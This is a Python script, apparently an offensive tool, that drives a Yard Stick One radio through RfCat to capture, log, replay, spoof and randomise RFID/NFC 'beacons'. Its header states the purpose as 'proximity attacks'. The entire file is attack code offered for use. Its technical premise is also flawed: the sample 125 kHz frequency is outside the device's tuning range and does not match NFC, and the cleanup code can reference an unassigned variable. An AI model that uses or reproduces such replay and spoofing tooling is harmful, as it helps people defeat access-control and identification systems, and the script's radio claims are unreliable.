import sys
import time
import argparse
import json
from rflib import *

# -------------------------------------------
# Yard Stick One Beacon Spammer
# -------------------------------------------
# Features:
# - Spoofs and replays RFID/NFC beacons for proximity attacks.
# - Captures and logs beacon transmissions.
# - Replays beacons on demand.
# - Can generate randomized beacon identifiers.
#
# Requirements:
# - Yard Stick One (YardStickOne) hardware
# - RfCat Python library
# - Python 3.x
#
# Usage:
# python yardstick_beacon_spammer.py --freq 125000 --capture --log beacons.json
# python yardstick_beacon_spammer.py --freq 125000 --replay beacons.json
# python yardstick_beacon_spammer.py --freq 125000 --spoof A1B2C3D4
# python yardstick_beacon_spammer.py --freq 125000 --random
# -------------------------------------------

def configure_device(d, frequency, power):
    """Configures the Yard Stick One device for beacon spoofing."""
    d.setModeRX()
    d.setFreq(frequency)
    d.setMaxPower() if power == 10 else d.setPower(power)
    print(f"[*] Configured: Frequency {frequency / 1e3} kHz, Power {power}")

def capture_beacons(d, log_file=None):
    """Captures beacon transmissions and logs them."""
    print("[+] Capturing beacon signals... Press Ctrl+C to stop.")
    beacons = []
    try:
        while True:
            packet = d.RFrecv(timeout=5000)
            if packet:
                beacon_data = packet.hex()
                print(f"[+] Captured Beacon: {beacon_data}")
                beacons.append(beacon_data)
                if log_file:
                    with open(log_file, "w") as f:
                        json.dump(beacons, f, indent=4)
    except KeyboardInterrupt:
        print("[!] Capture mode stopped.")

def replay_beacons(d, filename):
    """Replays captured beacon signals."""
    print(f"[+] Replaying beacons from {filename}...")
    try:
        with open(filename, "r") as f:
            beacons = json.load(f)
            for beacon in beacons:
                data = bytes.fromhex(beacon)
                d.setModeTX()
                d.RFxmit(data)
                print(f"[+] Replayed Beacon: {beacon}")
                time.sleep(1)
    except Exception as e:
        print(f"[!] Error replaying beacons: {e}")

def spoof_beacon(d, beacon_data):
    """Sends a manually defined spoofed beacon transmission."""
    print(f"[+] Spoofing beacon: {beacon_data}")
    try:
        data = bytes.fromhex(beacon_data)
        d.setModeTX()
        d.RFxmit(data)
        print(f"[+] Sent Spoofed Beacon: {beacon_data}")
    except Exception as e:
        print(f"[!] Error spoofing beacon: {e}")

def generate_random_beacon(d):
    """Generates and transmits a randomized beacon signal."""
    import random
    beacon_data = ''.join(random.choices("0123456789ABCDEF", k=8))
    print(f"[+] Sending Randomized Beacon: {beacon_data}")
    spoof_beacon(d, beacon_data)

def main():
    parser = argparse.ArgumentParser(description="Yard Stick One Beacon Spammer")
    parser.add_argument("--freq", type=int, required=True, help="Frequency in Hz for beacon spoofing")
    parser.add_argument("--power", type=int, default=10, help="Transmission power level (default: 10)")
    parser.add_argument("--capture", action='store_true', help="Capture beacon transmissions")
    parser.add_argument("--log", type=str, help="Log captured beacons to a file")
    parser.add_argument("--replay", type=str, help="Replay captured beacons from a file")
    parser.add_argument("--spoof", type=str, help="Manually input a beacon to spoof (hex string)")
    parser.add_argument("--random", action='store_true', help="Generate and transmit a random beacon")
    args = parser.parse_args()

    try:
        d = RfCat()
        configure_device(d, args.freq, args.power)
        
        if args.capture:
            capture_beacons(d, args.log)
        elif args.replay:
            replay_beacons(d, args.replay)
        elif args.spoof:
            spoof_beacon(d, args.spoof)
        elif args.random:
            generate_random_beacon(d)
        else:
            print("[!] No mode specified. Use --capture, --replay, --spoof, or --random.")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        d.setModeIDLE()
        d.cleanup()

if __name__ == "__main__":
    main()
